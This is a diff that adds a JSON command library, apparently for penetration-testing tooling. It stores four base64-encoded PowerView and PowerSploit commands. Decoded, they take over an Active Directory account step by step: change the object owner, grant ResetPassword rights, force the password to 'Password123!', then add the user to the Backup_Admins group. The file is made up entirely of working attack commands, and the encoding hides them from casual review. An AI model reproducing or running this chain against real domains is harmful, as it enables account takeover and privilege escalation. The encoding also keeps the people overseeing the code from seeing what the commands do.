@@ -1,0 +1,30 @@
+{
+    "command": {
+        "powerview_abuse_write_acl": {
+            "description": "Using write-access ACL, set the owner of a thing",
+            "commands": [
+                "U2V0LURvbWFpbk9iamVjdE93bmVyIC1JZGVudGl0eSBoZXJtYW4gLU93bmVySWRlbnRpdHkgbmljbyAtdmVyYm9zZQ=="
+            ]
+        },
+        "powerview_reset_password_rights": {
+            "description": "Reset the password RIGHTS of a user using PowerView with owner rights to the user",
+            "commands": [
+                "QWRkLURvbWFpbk9iamVjdEFjbCAtVGFyZ2V0SWRlbnRpdHkgSGVybWFuIC1QcmluY2lwYWxJZGVudGl0eSBuaWNvIC1SaWdodHMgUmVzZXRQYXNzd29yZCAtVmVyYm9zZQ=="
+            ]
+        },
+        "powersploit_reset_password": {
+            "description": "Reset password of a user using PowerSploit",
+            "commands": [
+                "JFVzZXJQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQpTZXQtRG9tYWluVXNlclBhc3N3b3JkIC1JZGVudGl0eSBIZXJtYW4gLUFjY291bnRQYXNzd29yZCAkVXNlclBhc3N3b3JkCg=="
+            ]
+        },
+        "powersploit_add_user_to_group": {
+            "description": "Add a user to a group using PowerSploit",
+            "commands": [
+                "JGNyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdoZXJtYW4nLCRVc2VyUGFzc3dvcmQpCkFkZC1Eb21haW5Hcm91cE1lbWJlciAtaWRlbnRpdHkgJ0JhY2t1cF9BZG1pbnMnIC1tZW1iZXJzIGhlcm1hbiAtY3JlZGVudGlhbCAkY3JlZA=="
+            ]
+        }
+    },
+    "configuration": {
+    }
+}
